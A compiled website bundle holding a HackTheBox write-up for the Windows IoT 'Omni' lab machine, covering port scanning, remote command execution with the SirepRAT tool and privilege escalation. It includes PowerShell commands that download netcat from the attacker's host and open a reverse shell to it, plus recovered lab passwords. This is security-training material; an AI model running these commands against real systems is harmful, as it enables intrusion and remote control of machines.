"use strict";(self.webpackChunkcyfun_me=self.webpackChunkcyfun_me||[]).push([[2837],{3905:(e,t,n)=>{n.d(t,{Zo:()=>p,kt:()=>h});var a=n(67294);function r(e,t,n){return t in e?Object.defineProperty(e,t,{value:n,enumerable:!0,configurable:!0,writable:!0}):e[t]=n,e}function o(e,t){var n=Object.keys(e);if(Object.getOwnPropertySymbols){var a=Object.getOwnPropertySymbols(e);t&&(a=a.filter((function(t){return Object.getOwnPropertyDescriptor(e,t).enumerable}))),n.push.apply(n,a)}return n}function i(e){for(var t=1;t<arguments.length;t++){var n=null!=arguments[t]?arguments[t]:{};t%2?o(Object(n),!0).forEach((function(t){r(e,t,n[t])})):Object.getOwnPropertyDescriptors?Object.defineProperties(e,Object.getOwnPropertyDescriptors(n)):o(Object(n)).forEach((function(t){Object.defineProperty(e,t,Object.getOwnPropertyDescriptor(n,t))}))}return e}function s(e,t){if(null==e)return{};var n,a,r=function(e,t){if(null==e)return{};var n,a,r={},o=Object.keys(e);for(a=0;a<o.length;a++)n=o[a],t.indexOf(n)>=0||(r[n]=e[n]);return r}(e,t);if(Object.getOwnPropertySymbols){var o=Object.getOwnPropertySymbols(e);for(a=0;a<o.length;a++)n=o[a],t.indexOf(n)>=0||Object.prototype.propertyIsEnumerable.call(e,n)&&(r[n]=e[n])}return r}var l=a.createContext({}),c=function(e){var t=a.useContext(l),n=t;return e&&(n="function"==typeof e?e(t):i(i({},t),e)),n},p=function(e){var t=c(e.components);return a.createElement(l.Provider,{value:t},e.children)},d="mdxType",m={inlineCode:"code",wrapper:function(e){var t=e.children;return a.createElement(a.Fragment,{},t)}},u=a.forwardRef((function(e,t){var n=e.components,r=e.mdxType,o=e.originalType,l=e.parentName,p=s(e,["components","mdxType","originalType","parentName"]),d=c(n),u=r,h=d["".concat(l,".").concat(u)]||d[u]||m[u]||o;return n?a.createElement(h,i(i({ref:t},p),{},{components:n})):a.createElement(h,i({ref:t},p))}));function h(e,t){var n=arguments,r=t&&t.mdxType;if("string"==typeof e||r){var o=n.length,i=new Array(o);i[0]=u;var s={};for(var l in t)hasOwnProperty.call(t,l)&&(s[l]=t[l]);s.originalType=e,s[d]="string"==typeof e?e:r,i[1]=s;for(var c=2;c<o;c++)i[c]=n[c];return a.createElement.apply(null,i)}return a.createElement.apply(null,n)}u.displayName="MDXCreateElement"},5399:(e,t,n)=>{n.r(t),n.d(t,{assets:()=>l,contentTitle:()=>i,default:()=>m,frontMatter:()=>o,metadata:()=>s,toc:()=>c});var a=n(87462),r=(n(67294),n(3905));const o={layout:"post",title:"Omni ",lang:"en",categories:["writeups"],tags:["security","writeups","htb","windows","IoT","pe"],date:"2021/01/31 18:01:00",thumbnail:"/img/HackTheBox/omni.png",toc:!0},i="Information",s={unversionedId:"HackTheBox/Omni/write-up",id:"HackTheBox/Omni/write-up",title:"Omni ",description:"- Name: Omni",source:"@site/writeups/HackTheBox/Omni/write-up.md",sourceDirName:"HackTheBox/Omni",slug:"/HackTheBox/Omni/write-up",permalink:"/writeups/HackTheBox/Omni/write-up",draft:!1,tags:[{label:"security",permalink:"/writeups/tags/security"},{label:"writeups",permalink:"/writeups/tags/writeups"},{label:"htb",permalink:"/writeups/tags/htb"},{label:"windows",permalink:"/writeups/tags/windows"},{label:"IoT",permalink:"/writeups/tags/io-t"},{label:"pe",permalink:"/writeups/tags/pe"}],version:"current",frontMatter:{layout:"post",title:"Omni ",lang:"en",categories:["writeups"],tags:["security","writeups","htb","windows","IoT","pe"],date:"2021/01/31 18:01:00",thumbnail:"/img/HackTheBox/omni.png",toc:!0},sidebar:"tutorialSidebar",previous:{title:"Obscurity ",permalink:"/writeups/HackTheBox/Obscurity/write-up"},next:{title:"Oouch ",permalink:"/writeups/HackTheBox/Oouch/write-up"}},l={},c=[{value:"Overview",id:"overview",level:2},{value:"Network enumeration",id:"network-enumeration",level:2},{value:"HTTP discovery",id:"http-discovery",level:2},{value:"Vulnerability search",id:"vulnerability-search",level:2},{value:"Exploitation: RCE",id:"exploitation-rce",level:2},{value:"Deploying a reverse shell",id:"deploying-a-reverse-shell",level:2},{value:"Privilege Escalation : stage 1",id:"privilege-escalation--stage-1",level:2},{value:"System enumeration with Powershell",id:"system-enumeration-with-powershell",level:2},{value:"Privilege Escalation : stage 2",id:"privilege-escalation--stage-2",level:2}],p={toc:c},d="wrapper";function m(e){let{components:t,...o}=e;return(0,r.kt)(d,(0,a.Z)({},p,o,{components:t,mdxType:"MDXLayout"}),(0,r.kt)("h1",{id:"information"},"Information"),(0,r.kt)("ul",null,(0,r.kt)("li",{parentName:"ul"},(0,r.kt)("strong",{parentName:"li"},"Name:")," Omni"),(0,r.kt)("li",{parentName:"ul"},(0,r.kt)("strong",{parentName:"li"},"Profile:")," ",(0,r.kt)("a",{parentName:"li",href:"https://www.hackthebox.eu/home/machines/profile/271"},"www.hackthebox.eu")),(0,r.kt)("li",{parentName:"ul"},(0,r.kt)("strong",{parentName:"li"},"Difficulty:")," Easy"),(0,r.kt)("li",{parentName:"ul"},(0,r.kt)("strong",{parentName:"li"},"OS:")," Other"),(0,r.kt)("li",{parentName:"ul"},(0,r.kt)("strong",{parentName:"li"},"Points:")," 20")),(0,r.kt)("p",null,(0,r.kt)("img",{alt:"Omni",src:n(35504).Z,width:"598",height:"381"})),(0,r.kt)("h2",{id:"overview"},"Overview"),(0,r.kt)("p",null,"Install tools used in this WU on BlackArch Linux:"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"$ pacman -S nmap windows-binaries\n$ pikaur -S powershell-bin\n")),(0,r.kt)("h2",{id:"network-enumeration"},"Network enumeration"),(0,r.kt)("p",null,"Port & service discovery scan with nmap:"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},'# Nmap 7.80 scan initiated Tue Oct 13 20:58:56 2020 as: nmap -sSVC -p- -oA nmap_full -v 10.10.10.204\nNmap scan report for 10.10.10.204\nHost is up (0.023s latency).\nNot shown: 65529 filtered ports\nPORT      STATE SERVICE  VERSION\n135/tcp   open  msrpc    Microsoft Windows RPC\n5985/tcp  open  upnp     Microsoft IIS httpd\n8080/tcp  open  upnp     Microsoft IIS httpd\n| http-auth:\n| HTTP/1.1 401 Unauthorized\\x0D\n|_  Basic realm=Windows Device Portal\n|_http-server-header: Microsoft-HTTPAPI/2.0\n|_http-title: Site doesn\'t have a title.\n29817/tcp open  unknown\n29819/tcp open  arcserve ARCserve Discovery\n29820/tcp open  unknown\n1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :\nSF-Port29820-TCP:V=7.80%I=7%D=10/13%Time=5F85F960%P=x86_64-unknown-linux-g\nSF:nu%r(NULL,10,"\\*LY\\xa5\\xfb`\\x04G\\xa9m\\x1c\\xc9}\\xc8O\\x12")%r(GenericLine\nSF:s,10,"\\*LY\\xa5\\xfb`\\x04G\\xa9m\\x1c\\xc9}\\xc8O\\x12")%r(Help,10,"\\*LY\\xa5\\x\nSF:fb`\\x04G\\xa9m\\x1c\\xc9}\\xc8O\\x12")%r(JavaRMI,10,"\\*LY\\xa5\\xfb`\\x04G\\xa9m\nSF:\\x1c\\xc9}\\xc8O\\x12");\nService Info: Host: PING; OS: Windows; CPE: cpe:/o:microsoft:windows\n\nRead data files from: /usr/bin/../share/nmap\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\n# Nmap done at Tue Oct 13 21:01:54 2020 -- 1 IP address (1 host up) scanned in 177.87 seconds\n')),(0,r.kt)("p",null,"At first glance this looks like a classic Windows, but remember the box type\nis not ",(0,r.kt)("em",{parentName:"p"},"Windows")," but ",(0,r.kt)("em",{parentName:"p"},"other"),"."),(0,r.kt)("p",null,"On port 8080, look at the Basic Auth realm: ",(0,r.kt)("em",{parentName:"p"},"Windows Device Portal"),"."),(0,r.kt)("p",null,"The ",(0,r.kt)("a",{parentName:"p",href:"https://docs.microsoft.com/en-us/windows/iot-core/manage-your-device/deviceportal"},"Windows Device Portal"),"\nis often used for ",(0,r.kt)("em",{parentName:"p"},"Windows 10 IoT"),"."),(0,r.kt)("h2",{id:"http-discovery"},"HTTP discovery"),(0,r.kt)("p",null,"We can try the default ",(0,r.kt)("a",{parentName:"p",href:"https://docs.microsoft.com/en-us/windows/iot-core/connect-your-device/iotdashboard"},"Windows 10 IoT Dashboard")," credentials on the ",(0,r.kt)("a",{parentName:"p",href:"https://docs.microsoft.com/en-us/windows/iot-core/manage-your-device/deviceportal"},"Windows Device Portal"),"\nbut this doesn't work."),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"Username: `Administrator`\nPassword: `p@ssw0rd`\n")),(0,r.kt)("h2",{id:"vulnerability-search"},"Vulnerability search"),(0,r.kt)("p",null,"Let's search for Windows IoT Core vulnerabilities."),(0,r.kt)("ul",null,(0,r.kt)("li",{parentName:"ul"},(0,r.kt)("a",{parentName:"li",href:"https://www.zdnet.com/article/new-exploit-lets-attackers-take-control-of-windows-iot-core-devices/"},"New exploit lets attackers take control of Windows IoT Core devices")),(0,r.kt)("li",{parentName:"ul"},(0,r.kt)("a",{parentName:"li",href:"https://nakedsecurity.sophos.com/2019/03/05/windows-iot-exploit-permits-directly-connected-device-pwnage/"},"Windows IoT Core exploitable via ethernet")),(0,r.kt)("li",{parentName:"ul"},(0,r.kt)("a",{parentName:"li",href:"https://www.bleepingcomputer.com/news/security/windows-10-iot-core-test-interface-lets-attackers-take-over-devices/"},"Windows 10 IoT Core Test Interface Lets Attackers Take Over Devices")),(0,r.kt)("li",{parentName:"ul"},(0,r.kt)("a",{parentName:"li",href:"https://safebreach.com/Post/SafeBreach-Labs-Discloses-New-Microsoft-Windows-IoT-Core-Weakness-and-Exploit"},"SafeBreach Labs Discloses New Microsoft Windows IoT Core Weakness and Exploit"))),(0,r.kt)("p",null,"We can also read the ",(0,r.kt)("a",{parentName:"p",href:"https://github.com/SafeBreach-Labs/SirepRAT/blob/master/docs/SirepRAT_RCE_as_SYSTEM_on_Windows_IoT_Core_White_Paper.pdf"},"Windows IoT Core: RCE as System")," PDF paper from SafeBreach."),(0,r.kt)("p",null,"They also produced a tool to exploit the vulnerability called ",(0,r.kt)("a",{parentName:"p",href:"https://github.com/SafeBreach-Labs/SirepRAT"},"SirepRAT"),"."),(0,r.kt)("h2",{id:"exploitation-rce"},"Exploitation: RCE"),(0,r.kt)("p",null,"Let's install a virtual python environment to avoid messing with our system\nlibraries when installing the dependencies of the tool.\nAlso even if the tool was released in 2019 the author (dorazouri) had the bad\nidea to develop in with the long time deprecated python 2. So let's install\na deprecated python 2 environment."),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"$ asdf install python 2.7.18\n$ asdf local python 2.7.18\n$ asdf current python\npython          2.7.18           /home/cyfun/CTF/HackTheBox/machines/Omni/.tool-versions\n")),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"$ git clone https://github.com/SafeBreach-Labs/SirepRAT.git\n$ cd SirepRAT\n$ pip2 install -r requirements.txt\n")),(0,r.kt)("p",null,"Because we are in the virtual environment, our default python is now the deprecated\npython 2 instead of python 3."),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"$ python --version\nPython 2.7.18\n")),(0,r.kt)("p",null,"So we can now executed the tool:"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"$ python SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --return_output --cmd \"C:\\Windows\\System32\\hostname.exe\"\n<HResultResult | type: 1, payload length: 4, HResult: 0x0>\n<OutputStreamResult | type: 11, payload length: 6, payload peek: 'omni'>\n<ErrorStreamResult | type: 12, payload length: 4, payload peek: ''>\n")),(0,r.kt)("p",null,"The RCE works, we retrieved the hostname."),(0,r.kt)("h2",{id:"deploying-a-reverse-shell"},"Deploying a reverse shell"),(0,r.kt)("p",null,"We can't use classis LOLBAS like certutils for downloading but we can still use powershell."),(0,r.kt)("p",null,"We can use one of those ",(0,r.kt)("a",{parentName:"p",href:"https://blog.jourdant.me/post/3-ways-to-download-files-with-powershell"},"three methods"),":"),(0,r.kt)("ol",null,(0,r.kt)("li",{parentName:"ol"},"Invoke-WebRequest"),(0,r.kt)("li",{parentName:"ol"},"System.Net.WebClient"),(0,r.kt)("li",{parentName:"ol"},"Start-BitsTransfer")),(0,r.kt)("p",null,"So let's use ",(0,r.kt)("inlineCode",{parentName:"p"},"Invoke-WebRequest")," to download a binary served by our one-line ruby HTTP server:"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"$ ruby -run -ehttpd /usr/share/windows/windows-binaries/ -p9999\n[2020-10-13 22:46:52] INFO  WEBrick 1.6.0\n[2020-10-13 22:46:52] INFO  ruby 2.7.2 (2020-10-01) [x86_64-linux]\n[2020-10-13 22:46:52] INFO  WEBrick::HTTPServer#start: pid=53742 port=9999\n")),(0,r.kt)("p",null,"PS: It's no use to try a meterpreter or any MSF reverse shell are they will be\na good chance that Windows Defender will block it since we're on Windows 10.\nSo let's use ncat instead."),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},'$ python SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --return_output --cmd "C:\\Windows\\System32\\cmd.exe" --args " /c powershell Invoke-Webrequest -OutFile C:\\Windows\\temp\\ncat.exe -Uri http://10.10.14.173:9999/ncat.exe"\n<HResultResult | type: 1, payload length: 4, HResult: 0x0>\n')),(0,r.kt)("p",null,"Launching the ncat I had a compatibility error. Let's check the architecture:"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"$ python SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --return_output --cmd \"C:\\Windows\\System32\\cmd.exe\" --args ' /c powershell $env:PROCESSOR_ARCHITECTURE'\n<HResultResult | type: 1, payload length: 4, HResult: 0x0>\n<OutputStreamResult | type: 11, payload length: 7, payload peek: 'AMD64'>\n<ErrorStreamResult | type: 12, payload length: 4, payload peek: ''>\n")),(0,r.kt)("p",null,"I haven't found any pre-compiled version of ncat for Windows 64 bits so I\ndownloaded a ",(0,r.kt)("a",{parentName:"p",href:"https://eternallybored.org/misc/netcat/netcat-win32-1.12.zip"},"64 bits version of netcat (nc)"),"."),(0,r.kt)("p",null,"So I uploaded the 64 bits version the same way and executed it:"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},'$ python SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --return_output --cmd "C:\\Windows\\System32\\cmd.exe" --args " /c C:\\Windows\\temp\\nc64.exe 10.10.14.173 9999 -e powershell"\n')),(0,r.kt)("p",null,"I was able to receive the reverse shell:"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"$ pwncat -l 9999 -vv\nINFO: Listening on :::9999 (family 10/IPv6, TCP)\nINFO: Listening on 0.0.0.0:9999 (family 2/IPv4, TCP)\nINFO: Client connected from 10.10.10.204:49689 (family 2/IPv4, TCP)\nWindows PowerShell\nCopyright (C) Microsoft Corporation. All rights reserved.\n\nPS C:\\windows\\system32>\n")),(0,r.kt)("h2",{id:"privilege-escalation--stage-1"},"Privilege Escalation : stage 1"),(0,r.kt)("p",null,"We are logged as omni and we can list other accounts available:"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"PS C:\\windows\\system32> echo $env:UserName\nomni$\n\nPS C:\\windows\\system32> ls C:\\Data\\Users\n\n\n    Directory: C:\\Data\\Users\n\n\nMode                LastWriteTime         Length Name\n----                -------------         ------ ----\nd-----         7/4/2020   9:48 PM                administrator\nd-----         7/4/2020   9:53 PM                app\nd-----         7/3/2020  11:22 PM                DefaultAccount\nd-----         7/3/2020  11:22 PM                DevToolsUser\nd-r---       10/13/2020  12:08 PM                Public\nd-----         7/4/2020  10:29 PM                System\n")),(0,r.kt)("p",null,"Let's browse their directories:"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},'PS C:\\windows\\system32> gc C:\\Data\\Users\\app\\user.txt\n<Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04">\n  <Obj RefId="0">\n    <TN RefId="0">\n      <T>System.Management.Automation.PSCredential</T>\n      <T>System.Object</T>\n    </TN>\n    <ToString>System.Management.Automation.PSCredential</ToString>\n    <Props>\n      <S N="UserName">flag</S>\n      <SS N="Password">01000000d08c9ddf0115d1118c7a00c04fc297eb010000009e131d78fe272140835db3caa288536400000000020000000000106600000001000020000000ca1d29ad4939e04e514d26b9706a29aa403cc131a863dc57d7d69ef398e0731a000000000e800000000200002\n0000000eec9b13a75b6fd2ea6fd955909f9927dc2e77d41b19adde3951ff936d4a68ed750000000c6cb131e1a37a21b8eef7c34c053d034a3bf86efebefd8ff075f4e1f8cc00ec156fe26b4303047cee7764912eb6f85ee34a386293e78226a766a0e5d7b745a84b8f839dacee4fe6ffb6bb1cb53146c6340000000e3a43dfe678e3c6fc196e434106f1207e25c3b3b0ea37bd9e779cdd92bd44be23aaea507b6cf2b614c7c2e71d211990af0986d008a36c133c36f4da2f9406ae7</SS>\n    </Props>\n  </Obj>\n</Objs>\n\nPS C:\\windows\\system32> gc C:\\Data\\Users\\administrator\\root.txt\n<Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04">\n  <Obj RefId="0">\n    <TN RefId="0">\n      <T>System.Management.Automation.PSCredential</T>\n      <T>System.Object</T>\n    </TN>\n    <ToString>System.Management.Automation.PSCredential</ToString>\n    <Props>\n      <S N="UserName">flag</S>\n      <SS N="Password">01000000d08c9ddf0115d1118c7a00c04fc297eb0100000011d9a9af9398c648be30a7dd764d1f3a000000000200000000001066000000010000200000004f4016524600b3914d83c0f88322cbed77ed3e3477dfdc9df1a2a5822021439b000000000e8000000002000020000000dd198d09b343e3b6fcb9900b77eb64372126aea207594bbe5bb76bf6ac5b57f4500000002e94c4a2d8f0079b37b33a75c6ca83efadabe077816aa2221ff887feb2aa08500f3cf8d8c5b445ba2815c5e9424926fca73fb4462a6a706406e3fc0d148b798c71052fc82db4c4be29ca8f78f0233464400000008537cfaacb6f689ea353aa5b44592cd4963acbf5c2418c31a49bb5c0e76fcc3692adc330a85e8d8d856b62f35d8692437c2f1b40ebbf5971cd260f738dada1a7</SS>\n    </Props>\n  </Obj>\n</Objs>\n\nPS C:\\windows\\system32> gc C:\\Data\\Users\\app\\iot-admin.xml\ngc C:\\Data\\Users\\app\\iot-admin.xml\n<Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04">\n  <Obj RefId="0">\n    <TN RefId="0">\n      <T>System.Management.Automation.PSCredential</T>\n      <T>System.Object</T>\n    </TN>\n    <ToString>System.Management.Automation.PSCredential</ToString>\n    <Props>\n      <S N="UserName">omni\\administrator</S>\n      <SS N="Password">01000000d08c9ddf0115d1118c7a00c04fc297eb010000009e131d78fe272140835db3caa28853640000000002000000000010660000000100002000000000855856bea37267a6f9b37f9ebad14e910d62feb252fdc98a48634d18ae4ebe000000000e80000000020000200000000648cd59a0cc43932e3382b5197a1928ce91e87321c0d3d785232371222f554830000000b6205d1abb57026bc339694e42094fd7ad366fe93cbdf1c8c8e72949f56d7e84e40b92e90df02d635088d789ae52c0d640000000403cfe531963fc59aa5e15115091f6daf994d1afb3c2643c945f2f4b8f15859703650f2747a60cf9e70b56b91cebfab773d0ca89a57553ea1040af3ea3085c27</SS>\n    </Props>\n  </Obj>\n</Objs>\n')),(0,r.kt)("p",null,"We got the flags but they are encrypted in PSCredential objects."),(0,r.kt)("p",null,"I seems we will be bale to decrypt them with ",(0,r.kt)("a",{parentName:"p",href:"https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/import-clixml?view=powershell-7"},"Import-Clixml")," to ",(0,r.kt)("a",{parentName:"p",href:"https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/import-clixml?view=powershell-7#example-2--import-a-secure-credential-object"},"Import a secure credential object"),"."),(0,r.kt)("ul",null,(0,r.kt)("li",{parentName:"ul"},(0,r.kt)("a",{parentName:"li",href:"https://www.travisgan.com/2015/06/powershell-password-encryption.html"},"Powershell Password Encryption & Decryption")),(0,r.kt)("li",{parentName:"ul"},(0,r.kt)("a",{parentName:"li",href:"https://mcpmag.com/articles/2017/07/20/save-and-read-sensitive-data-with-powershell.aspx"},"How To Save and Read Sensitive Data with PowerShell"))),(0,r.kt)("p",null,"But to do that we'll need to be logged as the target user or at least know\ntheir credentials."),(0,r.kt)("h2",{id:"system-enumeration-with-powershell"},"System enumeration with Powershell"),(0,r.kt)("p",null,"Rather than using the long options of ",(0,r.kt)("a",{parentName:"p",href:"https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.management/get-childitem?view=powershell-7"},"get-childitem"),", I wanted to use the short aliases, so here is a command\nI found on StackOverflow to list the parameter aliases:"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre",className:"language-powershell"},"PS /home/cyfun> Get-Command get-childitem |\n>>     ForEach-Object {$_.parameters |\n>>         ForEach-Object { $_.Values |\n>>             Where-Object {\n>>                 $_.Aliases.Count -gt 0 } |\n>>                 Select-Object Name, Aliases\n>>             }\n>>     }\n\nName                Aliases\n----                -------\nLiteralPath         {PSPath, LP}\nRecurse             {s}\nVerbose             {vb}\nDebug               {db}\nErrorAction         {ea}\nWarningAction       {wa}\nInformationAction   {infa}\nErrorVariable       {ev}\nWarningVariable     {wv}\nInformationVariable {iv}\nOutVariable         {ov}\nOutBuffer           {ob}\nPipelineVariable    {pv}\nDirectory           {ad, d}\nFile                {af}\nHidden              {ah, h}\nReadOnly            {ar}\nSystem              {as}\n")),(0,r.kt)("p",null,"Here is the long and the short way to write a recursive find equivalent for\nWindows in Powershell:"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre",className:"language-powershell"},"$ Get-ChildItem -Path c:\\ -Recurse -ErrorAction SilentlyContinue -Force -Filter *.vbs\n$ gci -Path c:\\ -s -ea SilentlyContinue -Force -Filter *.vbs\n")),(0,r.kt)("p",null,"Found no interesting VBS scripts, so let's find bat scripts instead."),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre",className:"language-powershell"},"$ gci -Path c:\\ -s -ea SilentlyContinue -Force -Filter *.bat\n\n    Directory: C:\\Program Files\\WindowsPowerShell\\Modules\\PackageManagement\n\n\nMode                LastWriteTime         Length Name\n----                -------------         ------ ----\n-a-h--        8/21/2020  12:56 PM            247 r.bat\n\n\n    Directory: C:\\Program Files\\WindowsPowerShell\\Modules\\Pester\\3.4.0\n\n\nMode                LastWriteTime         Length Name\n----                -------------         ------ ----\n-a----       10/26/2018  11:36 PM            744 Build.bat\n\n\n    Directory: C:\\Program Files\\WindowsPowerShell\\Modules\\Pester\\3.4.0\\bin\n\n\nMode                LastWriteTime         Length Name\n----                -------------         ------ ----\n-a----       10/26/2018  11:36 PM            925 Pester.bat\n")),(0,r.kt)("p",null,"There are some promising scripts."),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre",className:"language-batch"},'PS C:\\windows\\system32> gc \'C:\\Program Files\\WindowsPowerShell\\Modules\\PackageManagement\\r.bat\'\n@echo off\n\n:LOOP\n\nfor /F "skip=6" %%i in (\'net localgroup "administrators"\') do net localgroup "administrators" %%i /delete\n\nnet user app mesh5143\nnet user administrator _1nt3rn37ofTh1nGz\n\nping -n 3 127.0.0.1\n\ncls\n\nGOTO :LOOP\n\n:EXIT\n')),(0,r.kt)("p",null,"Here we are we obtained the credentials of the users."),(0,r.kt)("h2",{id:"privilege-escalation--stage-2"},"Privilege Escalation : stage 2"),(0,r.kt)("p",null,'It no use to break our brain cells trying some "runas" commands. We can use those\ncredentials over the device portal (',(0,r.kt)("a",{parentName:"p",href:"http://10.10.10.204:8080"},"http://10.10.10.204:8080"),")."),(0,r.kt)("p",null,"Then in the ",(0,r.kt)("em",{parentName:"p"},"Process")," menu, there is a ",(0,r.kt)("em",{parentName:"p"},"Run Command")," sub-menu."),(0,r.kt)("p",null,"When trying to run ",(0,r.kt)("inlineCode",{parentName:"p"},"C:\\Windows\\temp\\nc64.exe 10.10.14.173 8888 -e powershell"),"\nwe have an access denied."),(0,r.kt)("p",null,"So let's try the decrypt command directly"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre",className:"language-powershell"},"powershell $credential = Import-CliXml -Path U:\\Users\\app\\user.txt; $credential.GetNetworkCredential().Password\n\n7cfd50f6bc34db3204898f1505ad9d70\n")),(0,r.kt)("p",null,(0,r.kt)("img",{parentName:"p",src:"https://i.imgur.com/tGBa9l4.png",alt:null})),(0,r.kt)("p",null,"Now let's do the same with the admin account."),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre",className:"language-powershell"},"powershell $credential = Import-CliXml -Path U:\\Users\\administrator\\root.txt; $credential.GetNetworkCredential().Password\n\n5dbdce5569e2c4708617c0ce6e9bf11d\n")))}m.isMDXComponent=!0},35504:(e,t,n)=>{n.d(t,{Z:()=>a});const a=n.p+"assets/images/omni-75b3d01fb29249eb27a63aab89381ba7.png"}}]);